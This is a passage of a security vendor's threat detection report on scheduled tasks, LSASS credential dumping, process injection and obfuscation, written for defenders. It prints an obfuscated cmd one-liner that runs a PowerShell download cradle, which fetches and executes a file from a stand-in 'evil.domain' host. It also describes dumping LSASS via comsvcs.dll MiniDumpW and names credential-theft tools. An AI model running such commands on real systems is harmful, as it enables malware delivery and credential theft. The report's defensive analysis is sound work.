AFFECTED\n\n#### 2,740\n\n###### CONFIRMED THREATS\n\n\n-----\n\nLet this adversary’s use of both Scheduled Task and Obfuscated Files or\n\nInformation serve as a general reminder that these techniques rarely walk\n\nalone—your scheduled task detections need to account for obfuscation\n\ntechniques.\n\nAfter /Create, /Change is the second most common flag passed to schtasks,\n\nfollowed in order by /Run, /Delete, and /Query.\n\nScheduled tasks can run at a set time or in response to a triggering event on\n\nthe endpoint. Adversaries can choose any one of the 86,400 seconds in a day to\n\nexecute their tasks, but due to code reuse, they often schedule their executions\n\nfor the same time across each endpoint targeted by their campaigns. This is an\n\narea where code reuse may play to the defender’s advantage. In our data set, 86\n\npercent of the scheduled task creation events designated specific start times\n\nby passing time-of-day arguments to the start time (/ST) parameter. Scheduled\n\ntask creation events that don’t specify otherwise default to starting at the task’s\n\n[creation time. Scheduled task activity from detections associated with Blue](https://redcanary.com/blog/blue-mockingbird-cryptominer/)\n\n**[Mockingbird contributed significantly to the prevalence of this technique.](https://redcanary.com/blog/blue-mockingbird-cryptominer/)**\n\nThe following image illustrates scheduled task start times (in UTC) across the\n\nenvironments we monitor:\n\n\n-----\n\nIn addition to specifying the start time for a given scheduled task, adversaries\n\ncan use the /SC (Schedule) flag in combination with one of the values in the\n\nY-axis of the chart below (Daily, Minute, etc.) to set the frequency of the\n\ntask’s execution.\n\nNote that schedule values can be modified to the scheduled frequency of\n\nexecution. In other words, just because a task is created with /SC Minute\n\ndoesn’t mean it will run every minute. If the task is created with the /MO flag, its\n\narguments will modify the frequency of execution. So if /SC Minute and /MO 67\n\nare present when the task is created, it will execute every 67 minutes. Though\n\n**/MO isn’t commonly observed, it is worth mentioning because of the impact it**\n\nhas on frequency of execution.\n\nThe /MO frequency modifier can also be applied to any Onevent scheduled task.\n\nOnevent frequencies instruct the scheduled task to execute in response to an\n\nevent on the endpoint. When Onevent is used, the argument passed to the /MO\n\nflag will be an XPath event query string. In 2020, we found seven instances of\n\n**/SC Onevent, all of which passed the following XPath event query string to the**\n\n**/MO flag:**\n\n```\n*[system[provider[@name=’microsoft-windowssecurity-auditing’] and eventid=4801]]\n\n```\n\nThis XPath event query string will match any events in the Windows Security\n\nEvent Log with Event ID 4801, which may be logged when the workstation is\n\nunlocked, depending on the applicable audit policy.\n\n\n-----\n\n###### Privilege escalation\n\nIn addition to providing adversaries with a means of maintaining access to\n\nenvironments, scheduled tasks can also run under a specified user context. In\n\nour data, 81 percent of the created tasks were set to run as SYSTEM—the most\n\nprivileged account on Windows. When a scheduled task is created without\n\nspecifying a user context, it will run in the context of the user who created the\n\ntask. This is the second most common configuration we observed.\n\n##### Detection\n\n###### Collection requirements\n\n Windows event logs\n\nFor Windows systems, the Microsoft-Windows-Task-Scheduler/Operational log\n\nis a good source for monitoring the creation, modification, deletion, and use\n\nof scheduled tasks. Event IDs 106 and 140 record when a new scheduled task is\n\ncreated or updated, respectively, along with the name of the task. For creation\n\nevents, the user context is captured. Event ID 141 in this same log source will\n\ncapture deletion of scheduled tasks.\n\nOther logging options require enabling Object Access auditing and creating\n\nspecific Security Access Control Lists (SACL). When enabled, the Windows\n\nSecurity Event Log will collect Event IDs 4698, 4699, 4700, and 4701 for\n\nscheduled task creation, deletion, enabling, and disabling events, respectively.\n\n###### Process and command-line monitoring\n\n[Enabling process auditing, including the capturing of command-line arguments](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing)\n\nvia Group Policy, can also provide significant visibility into scheduled task\n\ncreation and modification events.\n\nForwarding these events to a SIEM or other log aggregation system and\n\nregularly reviewing the events through automation can facilitate detection of\n\nsuspicious activity.\n\n\n###### T 1 0 5 3 . 0 0 5 : S C H E D U L E D T A S K\n\n“Adversaries may abuse the Windows\n\nTask Scheduler to perform task\n\nscheduling for initial or recurring\n\nexecution of malicious code. There\n\nare multiple ways to access the\n\nTask Scheduler in Windows. The\n\n<code>schtasks</code> can be run\n\ndirectly on the command line, or the\n\nTask Scheduler can be opened through\n\nthe GUI within the Administrator\n\nTools section of the Control Panel. In\n\nsome cases, adversaries have used\n\na .NET wrapper for the Windows\n\nTask Scheduler, and alternatively,\n\nadversaries have used the Windows\n\nnetapi32 library to create a\n\nscheduled task.”\n\n\n-----\n\n###### Other sources\n\nAnother option for collecting information about existing scheduled tasks on\n\nWindows is the PowerShell Get-ScheduledTask cmdlet. If PowerShell remoting\n\nis enabled in the environment, this cmdlet can be run against remote systems\n\nto collect scheduled tasks in a somewhat scalable manner. Similarly, you can\n\ngather a great deal of information directly from schtasks.exe by running the\n\nfollowing command:\n\n```\nschtasks.exe /query /fo csv /v\n\n```\n\n###### Detection opportunities\n\nWe commonly observe the following binaries in malicious scheduled\n\ntask execution:\n\n**•** **cmd.exe**\n\n**•** **powershell.exe**\n\n**•** **regsvr32.exe**\n\n**•** **rundll32.exe**\n\nFor defenders and hunt teams, if you find one malicious scheduled task in\n\nyour environment, consider using properties of that event—task name, start\n\ntime, task run, etc.—as elements in your hunt or even detection logic. Use\n\navailable tooling to collect scheduled tasks from across your enterprise and\n\nsearch for specific properties that match the known malicious scheduled\n\ntask (i.e., recurring start times of unusual scheduled tasks across endpoints).\n\nUnderstanding what is normal in your environment is a tremendous boon for\n\nidentifying suspicious scheduled task activity.\n\n###### Tasknames and Taskruns\n\nTwo elements of scheduled tasks that may lend themselves to threat hunting\n\nand/or detection are taskname and taskrun, which are passed arguments to the\n\n**/TN and /TR flags respectively,**\n\n**[Tasknames vary widely in our data set. Though Blue Mockingbird dominated](https://redcanary.com/blog/blue-mockingbird-cryptominer/)**\n\nour dataset with the taskname Windows Problems Collection, other threat\n\nactors and malware families commonly use GUIDs, as is the case with QBot, or\n\n\n-----\n\nnames that attempt to blend in with seemingly legitimate system activity (e.g.,\n\n**AdobeFlashSync, setup service management, WindowsServerUpdateService,**\n\netc.). Random strings between seven and nine characters are also common.\n\nIt’s worth looking out for scheduled task executions containing the tasknames\n\nor /TN value and any of the above examples. These won’t always be malicious,\n\nbut with some baselining, you should be able to sort normal and benign from\n\nunusual and suspicious.\n\n**Taskrun values, on the other hand, specify what should be executed at the**\n\nscheduled time. Expect attackers to try and blend in here as well, with LOLBINs\n\nor by naming their on-disk malware to resemble legitimate system utilities. Blue\n\nMockingbird dominated once again, with more than 2,000 scheduled tasks with\n\na taskrun value of regsvr32.exe /s c:\\windows\\system32\\wercplsupporte.\n\n**dll. Searching for execution of scheduled tasks with wercplsupporte.dll in the**\n\n**taskrun is a viable method of detecting Blue Mockingbird, but don’t confuse the**\n\nabove DLL with the legitimate wercplsupporte.dll in the same directory.\n\nOf all the properties in a scheduled task, taskrun is probably the most critical\n\nto scrutinize. If you see a strange binary, investigate it. Any taskrun value that\n\npoints to a script deserves a closer look, as adversaries may modify an existing\n\nbenign script by adding malicious code to it. Building automation to return\n\ncryptographic hashes of these scripts and monitoring them for changes may be\n\nuseful in detection efforts.\n\n###### Scheduling tasks without schtask.exe\n\nAdversaries can create or modify tasks without calling schtasks.exe or\n\n**taskschd.msc directly with the help of COM objects. Therefore, monitoring**\n\nfor file creation and modification events in \\Windows\\System32\\Tasks and \\\n\n**Windows\\SysWow64\\Tasks directories may provide added value in identifying**\n\ninteresting activity. This may be particularly useful on critical systems where\n\nscheduled tasks should be relatively static.\n\n###### Unusual module loads\n\nMonitoring for image loads—specifically of \\Windows\\System32\\taskschd.dll by\n\nprocesses that wouldn’t normally load that DLL like Excel or Word—may indicate\n\nthat a macro is creating or modifying a scheduled task.\n\n###### Weeding out false positives\n\nAny detection strategy should start with a baseline understanding of what is\n\nin your environment normally. Current Windows systems commonly include\n\n\n-----\n\nmore than 100 scheduled tasks by default. As more software packages are\n\ninstalled, they may create additional scheduled tasks for regular updates and\n\nother reasons. Knowing what these tasks are, their normal schedules, and their\n\n**taskrun values will be essential to filtering them out of the review process.**\n\n\n**I N C I D E N T**\n**H A N D L E R**\n\nTyler has been working in information\n\ntechnology since 2012. He started his\n\ncareer as a desktop support technician\n\nworking for small MSPs. He then studied\n\npenetration testing, which got him\n\ninterested in information security. At\n\nRed Canary, Tyler helps customers\n\nunderstand threats within their\n\nenvironment and how to leverage their\n\nEDR platform to improve their security\n\nprogram.\n\n###### Jason Killam\n\n**D E T EC T I O N**\n**E N G I N E E R**\n\nJason works on Red Canary’s Cyber\n\nIncident Response Team (CIRT) as\n\na detection engineer. Prior to that,\n\nJason worked as an incident responder\n\nfor security teams in the financial\n\nsector. Outside of work, he obsesses\n\nover space, rockets, posting malware\n\nindicators on twitter, and building\n\nlego sets.\n\n\n-----\n\n###### T E C H N I Q U E T 1 0 0 3\n\n##### OS Credential Dumping\n\nOS Credential Dumping ranks fifth this year thanks almost entirely to detections\n\n\n###### OVERALL RANK\n\n#### 19.1%\n\n\nassociated with its LSASS Memory sub-technique.\n\n\n**T 1 0 0 3 . 0 0 1**\n\n###### LSASS Memory\n\n\n###### 15.5% 1,447\nORGANIZATIONS AFFECTED CONFIRMED THREATS\n\nThe Local Security Authority Subsystem Service (LSASS) is a boon\nfor adversaries looking to steal sensitive, often encrypted data, with\na little help from administrative tools such as ProcDump\nand Mimikatz.\n\n\n###### ORGANIZATIONS AFFECTED\n\n#### 1,554\n\n\n###### CONFIRMED THREATS\n\n\n**S E E M O R E  >**\n\n\n###### T 1 0 0 3 : O S C R E D E N T I A L D U M P I N G\n\n“Adversaries may attempt to dump credentials to obtain account login and credential\n\n\nmaterial, normally in the form of a hash or a clear text password, from the operating\n\nsystem and software. Credentials can then be used to perform Lateral Movement and\n\n\naccess restricted information.”\n\n\n-----\n\n###### T E C H N I Q U E T 1 0 0 3 . 0 0 1\n\n##### LSASS Memory\n\nThe Local Security Authority Subsystem Service (LSASS) is a boon for\nadversaries looking to steal sensitive credentials, with a little help from\nadministrative tools such as ProcDump.\n\n##### Analysis\n\n###### Why do adversaries use  LSASS Memory?\n\nAdversaries commonly abuse the Local Security Authority Subsystem Service\n\n(LSASS) to dump credentials for privilege escalation, data theft, and lateral\n\nmovement. The process is a juicy target for adversaries because of the sheer\n\n[amount of sensitive information it stores in memory. Upon starting up, LSASS](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v=ws.11)#:~:text=LSASS%20process%20memory,-The%20Local%20Security&text=LSASS%20can%20store%20credentials%20in,NT%20hash)\n\ncontains valuable authentication data such as:\n\n- encrypted passwords\n\n- NT hashes\n\n- LM hashes\n\n- Kerberos tickets\n\nWhile there are a lot of different tools and techniques to abuse the LSASS\n\nprocess, adversaries will typically target this process first to obtain credentials.\n\nPost-exploitation frameworks like Cobalt Strike import and customize existing\n\ncode from credential theft tools like Mimikatz that allow operators to easily\n\naccess LSASS via existing beacons.\n\n###### How do adversaries use  LSASS Memory?\n\nAdversaries will use a variety of different tools to dump or scan the process\n\nmemory space of LSASS. After establishing control over their target, adversaries\n\nwill typically remotely transfer this dump file onto their own command and\n\ncontrol (C2) server to perform an offline password attack. Tools like Mimikatz\n\nare typically used on the compromised host to retrieve credentials from the\n\nstatic dump file or from live process memory. With these credentials, the\n\n\n###### PARENT TECHNIQUE RANK\n\n#### 15.5%\n\n###### ORGANIZATIONS AFFECTED\n\n#### 1,447\n\n###### CONFIRMED THREATS\n\n\n-----\n\nadversary can then laterally move throughout the environment and accomplish\n\ntheir goals.\n\nOver the last year, we’ve identified many different techniques leveraging LSASS.\n\nMore often than not, adversaries drop and execute trusted administrative tools\n\n[onto their target. The Sysinternals tool ProcDump continues to be the binary we](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)\n\nobserve most commonly.\n\nA trusted Windows process like Task Manager (taskmgr.exe) is capable of\n\ndumping arbitrary process memory if executed under a privileged user account.\n\nIt’s as simple as right-clicking on the LSASS process and hitting “Create\n\n[Dump File.” The Create Dump File calls the MiniDumpWriteDump function](https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump)\n\nimplemented in the following DLLs: Dbghelp.dll and Dbgcore.dll.\n\nAdditionally, the Windows DLL Host (rundll32.exe) can execute the Windows\n\nnative DLL comsvcs.dll, which exports a function called MiniDumpW. When this\n\n[export function is called by Rundll32, adversaries can feed in a process ID such](https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/)\n\nas LSASS and create a MiniDump file. These files are intended for developers\n\nto debug when applications crash and contain sensitive information like\n\ncredentials.\n\nHere are some tools we’ve observed accessing LSASS with different\n\nimplementations of Mimikatz:\n\n###### • Procdump (mainly renamed usage)\n • Task Manager (taskmgr.exe)\n • Rundll (comsvcs.dll)\n • Pwdump\n • Lsassy\n • Dumpert\n\n- Mimikatz\n\n- Cobalt Strike\n\n###### • Metasploit\n • LaZagne\n • Empire\n • Pypykatz\n\n Emerging LSASS Memory tradecraft \n\nAdversaries have used and abused Mimikatz for years. It leverages multiple\n\ndifferent techniques to steal credentials (not just from LSASS) and has been\n\nrewritten in many different languages, including Python, C#, and PowerShell.\n\nDiscovering rogue Mimikatz processes can be tricky because, since its inception,\n\ndefenders have only had to worry about detecting compiled binaries. Nowadays,\n\n\n-----\n\nMimikatz has been incorporated into post-exploitation frameworks that have\n\ntheir own evasion tactics.\n\n```\ncmd /V/C”set N1=   }}{hctac};kaerb;iB$ metIekovnI;)iB$,dq$(eliFdaolnwoD.cAB${yrt{)tlm$ ni\ndq$(hcaerof;’exe.’+Kjm$+’\\’+cilbup:vne$=iB$;’963’\n= Kjm$;)’@’(tilpS.’detcefni=l?php.suoici/lam/\nniamod.live//:ptth’=tlm$;tneilCbeW.teN tcejbowen=cAB$ llehsrewop&&for /L %R in (265;-1;0)do\nset ZR=!ZR!!N1:~%R,1!&&if %R==0 call %ZR:*ZR!=%\n\n```\n\nLooking at this command carefully, we can see it sets a variable named N1 to\n\na string containing a PowerShell command that is reversed. There’s a For loop\n\nthat reverses this string and executes it. The PowerShell command creates a\n\ndownload cradle to download a file and invokes it via a call to Invoke-Item.\n\nWhile these obfuscated commands may evade simple, signature-based\n\ndetections, analytics that look for commonly used obfuscation techniques, such\n\nas the presence of caret characters, can easily detect them. Layered detection\n\nanalytics will also help. If a detection misses the obfuscated DOS commands,\n\nanother detection may trigger on the PowerShell download cradle, the call to\n\n**Invoke-Item, or a DNS lookup to an unusual domain.**\n\n##### Detection\n\n###### Collection requirements\n\n Process monitoring\n\nOne of the most reliable data sources is monitoring for cross process injection\n\noperations. Stacking and investigating which processes are injecting into LSASS\n\ncan be a challenge. Depending on your enterprise software stack, you may need\n\nto tune your logic to rule out legitimate applications like antivirus (AV) solutions\n\nand password policy enforcement software. These applications have legitimate\n\nreasons to access and scan LSASS to enforce security controls.\n\nThe following data sources are readily available to audit and detect suspicious\n\nLSASS process access:\n\n###### • Built-in LSASS SACL auditing in Windows 10\n\n\n###### T 1 0 0 3 . 0 0 1 :  L S A S S M E M O R Y\n\n“Adversaries may attempt to access\n\ncredential material stored in the\n\nprocess memory of the Local Security\n\nAuthority Subsystem Service (LSASS).\n\nAfter a user logs on, the system\n\ngenerates and stores a variety of\n\ncredential materials in LSASS process\n\nmemory. These credential materials\n\ncan be harvested by an administrative\n\nuser or SYSTEM and used to conduct\n\nLateral Movement using Use Alternate\n\nAuthentication Material.”\n\n\n-----\n\n###### • Sysmon Process Access rules: Event ID 10\n • Microsoft Attack Surface Reduction (ASR) LSASS suspicious access rule\n\n File monitoring\n\nAnother great telemetry source that should be monitored closely is the creation\n\nof dmp files. After dumping the memory space of LSASS, adversaries typically\n\n[perform offline password attacks by leveraging a multitude of security tools](https://en.wikipedia.org/wiki/Category:Password_cracking_software)\n\n[and techniques. Certain memory dumping tools like Dumpert and SafetyKatz](https://github.com/outflanknl/Dumpert)\n\ncreate predictable memory dumps by default in certain file paths that you can\n\ndetect with high fidelity. As always though, the name and location of these\n\nfiles can be modified. Start with the default filenames and dive deeper into\n\nthe behavior by detonating these tools in a controlled environment. On top of\n\ncreating rules for specific tools, take a holistic look at what processes typically\n\nwrite dmp files and narrow down your logic from there.\n\n###### Network connections\n\nNetwork connections and child process data may also be reliable indicators\n\nof malicious code injected into LSASS. It’s rare for LSASS to execute child\n\nprocesses such as wmiprvse.exe, cmd.exe, and powershell.exe, which may\n\nspawn because of malicious code injection. On top of child processes, LSASS\n\nestablishes many internal network connections over ports 135, 445, and 88 to\n\nhandle authentication with internal network services.\n\n###### Detection opportunities\n\nThe days of detecting Mimikatz via traditional methods like AV, common\n\ncommand-line arguments, and binary metadata are far behind us. Instead, start\n\nat a high level and gather what normal LSASS activity looks like before writing\n\ndetection logic around abnormal behavior.\n\n###### Baselining\n\nRather than detecting on specific tools, we recommend establishing what\n\n“normal” LSASS memory access looks like within your environment. In doing so,\n\nyou can tune out normal usage and detect on any previously unknown tools or\n\ntechniques an adversary might use. To investigate this, start broad and narrow\n\ndown your detection logic.\n\n\n-----\n\n###### Suspicious injection into LSASS\n\nA detection analytic that has the potential to exhibit a high signal-to-noise ratio\n\nis to look for instances of powershell.exe or rundll32.exe that obtain a handle\n\nto LSASS. Under normal circumstances (assuming minor tuning), this behavior\n\nis rarely observed. We have detected post-exploitation frameworks such as\n\nCobalt Strike and PowerShell Empire with such logic during numerous incident\n\nresponse engagements and red team simulations. Examples of data sources\n\n[that raise handle access events are Sysmon Process Access events and Event ID](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90010)\n\n[4656 in the security Event Log in Windows 10.](https://www.tiraniddo.dev/2017/10/bypassing-sacl-auditing-on-lsass.html)\n\nDetection should not be limited to these three processes. As you’re formulating\n\na hypothesis about what constitutes normal and abnormal LSASS memory\n\ninjection, take into consideration any patterns you may observe. Ask yourself:\n\n- Are false positives being generated by processes located in certain\n\nprocess paths?\n\n- Are there some common characteristics of these processes we can\n\nidentify and exclude?\n\n- Which processes are typically being targeted by threats in the wild?\n\n###### MiniDumpW\n\nAs is discussed in the analysis section above, adversaries can create a MiniDump\n\nfile containing credentials by using Rundll32 to execute the MiniDumpW\n\nfunction in comsvcs.exe and feeding it the LSASS process ID. To detect this\n\nbehavior, you can monitor for the execution of a process that seems to be\n\n**rundll32.exe along with a command line containing the term minidump.**\n\n###### Weeding out false positives\n\nLSASS establishes a lot of cross process memory injection stemming from itself.\n\nWe identify far fewer false positives from processes injecting into LSASS. Some\n\npassword-protection products will scan LSASS to evaluate user passwords. If\n\napproved by your help desk or IT support, these applications should be added to\n\n[an allowlist as part of a continuous tuning process.](https://redcanary.com/blog/tuning-detectors/)\n\nWe don’t expect any raw data source to return a high false positive rate in itself.\n\nDetection logic should always be routinely maintained with constant tuning\n\nto prevent alert overload. Your analytics should act as a living, breathing code\n\nrepository with frequent, on-the-fly adjustments to navigate your\n\nevolving environment.\n\n\n###### Justin Schoenfeld\n\n**D E T EC T I O N**\n**E N G I N E E R**\n\nJustin works on the Detection\n\nEngineering team, which is responsible\n\nfor threat detection and intelligence\n\nresearch. He gained his B.A. in\n\nComputing Security from the Rochester\n\nInstitute of Technology, where he had\n\nthe opportunity to co-op for a large\n\ncorporation and a startup company. His\n\nlove for endpoint telemetry came from\n\nhis experience as an advanced threat\n\nengineer for a large global hospitality\n\ncompany. Justin is experienced in\n\nthreat hunting, incident response,\n\nand researching industry-wide\n\nthreat intelligence.\n\n\n-----\n\n###### T E C H N I Q U E T 1 0 5 5\n\n##### Process Injection\n\nProcess Injection enables adversaries to evade defensive controls by executing\npotentially suspicious processes in the context of seemingly benign ones.\n\n##### Analysis\n\n###### Why do adversaries use  Process Injection?\n\nProcess Injection is a versatile technique that facilitates a wide range of actions.\n\n[It’s so versatile, in fact, that MITRE reorganized it into 11 sub-techniques in](https://redcanary.com/blog/mitre-sub-techniques/)\n\nsummer 2020. Red Canary doesn’t currently map a substantial number of\n\ndetection analytics to any of Process Injection’s sub-techniques. We perform our\n\nmapping at the analytic level, which means we’re forecasting what technique an\n\nanalytic might detect. This works well in general, but it’s very hard to accurately\n\nforecast what type of injection might be used in the absence of context. As\n\nsuch, this section will focus on Process Injection generally, rather than its most\n\nprevalent sub-techniques.\n\nProcess Injection allows adversaries the ability to execute malicious activity by\n\nproxy through processes that either have information of value (e.g., lsass.exe)\n\nor as a means of blending in with seemingly “normal” processes. In this way,\n\nmalicious activity—whether an overtly malicious binary or a process that’s been\n\nco-opted as such—blends in with routine operating system processes. Process\n\nInjection allows payloads to be launched within the memory space of a running\n\nprocess, in many cases without needing to drop any malicious code to disk.\n\nFor example, you may be able to build a high-fidelity detection analytic that\n\ntriggers any time PowerShell makes an external network connection. However,\n\nto avoid this method of detection, an adversary might inject their PowerShell\n\nprocess into a browser. In doing so, they’ve taken a potentially suspicious\n\nbehavior—PowerShell making an external network connection—and replaced\n\nit with a seemingly normal behavior—a browser making an external network\n\nconnection. What was detectable based on process lineage and network\n\nconnections before Process Injection now relies on a mix of command-line\n\nparameters, binary metadata, and reputational scores, to name a few\n\ntelemetry sources.\n\n\n###### OVERALL RANK\n\n#### 31.6%\n\n###### ORGANIZATIONS AFFECTED\n\n#### 1,425\n\n###### CONFIRMED THREATS\n\n\n-----\n\nIn addition to being stealthy, arbitrary code can inherit the privilege level of the\n\nprocess it is injected into and gain access to parts of the operating system that\n\nshouldn’t be otherwise available.\n\n###### How do adversaries use  Process Injection?\n\nWith 11 sub-techniques, there’s no shortage of ways that an adversary can\n\nperform Process Injection. Some standout flavors include:\n\n- remotely injecting DLLs into running processes\n\n- injecting into high-reputation, built-in executables such as notepad.exe to\n\nmake external network connections and later injecting code that performs\n\nmalicious actions\n\n- leveraging Microsoft Office applications to create RemoteThread injections\n\ninto dllhost.exe to conduct attacks with malicious macros in place of\n\nspawning suspicious child processes\n\n- cross-process injection initiated by lsass.exe into taskhost.exe\n\n- Metasploit injecting itself into processes such as svchost.exe\n\n- injecting into a browser process to enable snooping on a user’s browsing\n\nsession, which is a common characteristic of banking and other credential\nstealing trojans\n\n- injecting into lsass.exe to dump memory and extract credentials\n\n- injecting into browsers to normalize network connections that would seem\n\nsuspicious if they were initiated by processes other than a browser\n\n**Searchprotocolhost.exe is another frequent target of Process Injection.**\n\nAdversaries take advantage of investigative biases that lead analysts to\n\ndisregard this built-in, signed, and sufficiently esoteric utility.\n\n###### Emerging Process Injection tradecraft\n\nWe wouldn’t characterize this as an emergent technique necessarily, but widely\n\nand openly available malware kits like Cobalt Strike, Metasploit, and other\n\noffensive tools have considerably lowered the barrier of entry for adversaries\n\nseeking to leverage Process Injection. What once existed mostly in the domain of\n\nmore capable adversaries has since trickled down to nearly everyone else.\n\n\n###### T 1 0 5 5 : P R O C E S S I N J E C T I O N\n\n“Adversaries may inject code into\n\nprocesses in order to evade process\nbased defenses as well as possibly\n\nelevate privileges. Process injection is\n\na method of executing arbitrary code\n\nin the address space of a separate live\n\nprocess. Running code in the context\n\nof another process may allow access to\n\nthe process’s memory, system/network\n\nresources, and possibly elevated\n\nprivileges. Execution via process\n\ninjection may also evade detection from\n\nsecurity products since the execution is\n\nmasked under a legitimate process.”\n\n\n-----\n\n##### Detection\n\n###### Collection requirements\n\n Process monitoring\n\nProcess monitoring is a minimum requirement for reliably detecting Process\n\nInjection. Even though injection can be invisible to some forms of process\n\nmonitoring, the effects of the injection become harder to miss once you\n\ncompare process behaviors against expected functionality.\n\n###### API monitoring\n\nIf possible, monitor API system calls that include CreateRemoteThread in\n\nWindows. This will indicate a process is using the Windows API to inject code\n\ninto another process. Security teams should monitor for ptrace system calls on\n\nLinux as well. Such monitoring would also include data sources that track when\n\n[a handle to a target process is requested and/or granted, like Sysmon Event](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90010)\n\n**[ID 10.](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90010)**\n\n###### Command-line monitoring\n\n[Certain endpoint detection and response (EDR) products and Sysmon can](https://redcanary.com/solutions/endpoint-detection-and-response/)\n\nprovide alerting on suspected Process Injection activity. With either tool,\n\nmonitoring for suspicious command-line parameters can be an effective way\n\nof observing and detecting potential Process Injection at scale. Some tools are\n\npurpose-built to have their injection arguments supplied at the command line,\n\nlike mavinject.exe. So while command-line monitoring can’t catch all forms of\n\ninjection, it can certainly help.\n\n###### Detection opportunities\n\nThe detection of Process Injection involves hunting for legitimate processes\n\ndoing unexpected things. This may involve processes making external\n\nnetwork connections and writing files or processes spawning with unexpected\n\ncommand-line arguments.\n\n###### Unusual process behaviors\n\nSome specific patterns of behavior to look out for:\n\n- a process that appears to be svchost.exe making network connections on\n\n\n-----\n\ntcp/447 and tcp/449, a behavior consistent with TrickBot\n\n- a process that appears to be notepad.exe making external\n\nnetwork connections\n\n- a process that appears to be mshta.exe calling CreateRemoteThread to\n\ninject code\n\n- a process that appears to be svchost.exe executing without corresponding\n\ncommand lines\n\n###### Unusual paths and command lines\n\nSome good examples of odd paths or command lines that may\n\nindicate injection:\n\n**•** **rundll32.exe, regasm.exe, regsvr32.exe, regsvcs.exe, svchost.exe, and**\n\n**wefault.exe process executions without command-line options may**\n\nindicate they are targets of Process Injection\n\n- Microsoft processes such as vbc.exe with command lines including\n\n**/scomma, /shtml, or /test may indicate the injection of Nirsoft tools for**\n\ncredential access\n\n- Linux processes with memfd: in their path indicate they were spawned from\n\ncode injected into another process\n\n###### Injection into LSASS\n\nSince injection into lsass.exe is common, impactful, and frequently suspicious,\n\nit deserves to be called out individually. To that point, it would be worth your\n\ntime to determine and enumerate the processes in your environment that\n\nroutinely or occasionally obtain a handle to lsass.exe. Any access outside of the\n\nbaseline should be treated as suspicious. Discerning suspicious from malicious\n\nmight involve considering the reputation of the unusual process that requested\n\nthe access to lsass.exe (e.g., powershell.exe process with an unexpected\n\ncommand line, access requests from from an unsigned executable located in a\n\nworld-writable directory like %APPDATA% or %ProgramData%, etc.).\n\n###### Weeding out false positives\n\nThe analytics that produced the most false positives in our dataset came from\n\nlooking for CreateRemoteThread calls from any and all processes. Many tools\n\nin Windows use Process Injection legitimately for debugging and virtualization.\n\nIf you want to write analytics around this API call, focus them on unusual source\n\nprocesses, such as Microsoft Office products and tools that commonly deliver\n\nfirst-stage malware like scripts and Mshta.\n\n\n-----\n\nFurther, processes like lsass.exe and svchost.exe are both common targets for\n\nProcess Injection and common processes in general. As such, baselining normal\n\nagainst abnormal will be an important step in fighting false positives. Consider\n\nthe following:\n\n- In some environments, you might be able to reliably detect on specific\n\nprocesses injecting into lsass.exe. However, you might achieve better\n\ndetection outcomes by correlating cross processes with executing\n\nprocesses, including LOLBINs like MSbuild, PowerShell, Wscript, Cscript,\n\nMsiexec, Rundll32, and more\n\n- Additionally, svchost.exe is a common process targeted for Process\n\nInjection. Due to the large volume, taking the approach of identifying\n\nknown processes that may execute code can help reduce the amount of\n\nnoise generated\n\n\n###### Shane Welcher\n\n**D E T EC T I O N**\n**E N G I N E E R**\n\nShane has a wide range of security\n\nexperience: data analysis, forensics,\n\ndebugging malware, penetration\n\ntesting, and network and system\n\nadministration. He is passionate\n\nabout open source projects and was\n\nthe highest community contributor to\n\nthe Atomic Red Team GitHub project\n\nbefore joining Red Canary. In his free\n\ntime, Shane enjoys studying different\n\napproaches to exploiting networks\n\nand applications, assisting others with\n\nopen-source SIEM solutions,\n\nand traveling.\n\n\n-----\n\n###### T E C H N I Q U E T 1 0 2 7\n\n##### Obfuscated Files  or Information\n\nObfuscation and encoding empowers adversaries to perform malicious actions\nthat, if executed in plaintext, would be trivial to prevent, detect, or otherwise\nmitigate.\n\n##### Analysis\n\n###### Why do adversaries use  Obfuscated Files or Information?\n\nAdversaries employ obfuscation to evade simple, signature-based detections\n\nand to impede analysis. Since obfuscation can be used by software and IT staff\n\nin the regular course of business, analysts investigating potentially malicious\n\nobfuscation are often left to wonder if what they are seeing reflects a legitimate\n\nbusiness use or something nefarious. However, some obfuscation techniques\n\nare so focused on fooling machines that they disproportionately draw human\n\nattention.\n\nIf you consider the conspicuousness of the alternative—performing clearly\n\nmalicious actions in plain sight—it makes complete sense that adversaries\n\nwould take the time and effort to encrypt, encode, or otherwise obfuscate files\n\nor information that, in plaintext form, would be trivial to detect, block,\n\nand/or mitigate.\n\n###### How do adversaries use  Obfuscated Files or Information?\n\nObfuscation comes in many forms. In this section we will attempt to enumerate\n\nand briefly describe the obfuscation techniques that we observe most often\n\nacross the environments we monitor.\n\n\n###### OVERALL RANK\n\n#### 33.8%\n\n###### ORGANIZATIONS AFFECTED\n\n#### 1,341\n\n###### CONFIRMED THREATS\n\n\n-----\n\n###### Base64 encoding\n\nBase64 encoding is the variety of obfuscation that we encounter most\n\nfrequently. It enables binary data to transit text-only pathways and eliminates\n\nissues around string quoting and the need to escape special characters.\n\nAdministrators and developers use Base64 encoding to pass scripts to\n\nsubprocesses or remote systems, as well as to conceal sensitive information.\n\nThese same benefits appeal to adversaries.\n\nNearly all of the 1,300 detections involving obfuscation we observed last\n\nyear used Base64 encoding in conjunction with PowerShell. The following is\n\nan example of PowerShell combined with Base64 encoding from an activity\n\n[cluster we named Yellow Cockatoo. This example combines multiple types of](https://redcanary.com/blog/yellow-cockatoo/)\n\nobfuscation beyond just Base64, including XOR obfuscation.\n\n###### String concatenation\n\nString concatenation is the second-most-common obfuscation variant Red\n\nCanary observed in 2020. Adversaries use string concatenation for the same\n\nreasons they use Base64 encoding: to hide malicious strings from automated\n\ndetections that rely on overly exacting signatures and to confound analysts.\n\nString concatenation comes in many forms, such as:\n\n- The + operator can be used to combine string values\n\n- The -join operator combines characters, strings, bytes, and other elements\n\nusing a specified delimiter character\n\n- Since PowerShell has access to .NET method, it can use the [System.\n\n**String]::Join() method, which also combines characters like the -join**\n\noperator\n\n\n-----\n\n- String interpolation allows adversaries to set values such that u can equal\n\n**util.exe and cert%u% then executes as certutil.exe, effectively evading**\n\ncertain signature-based 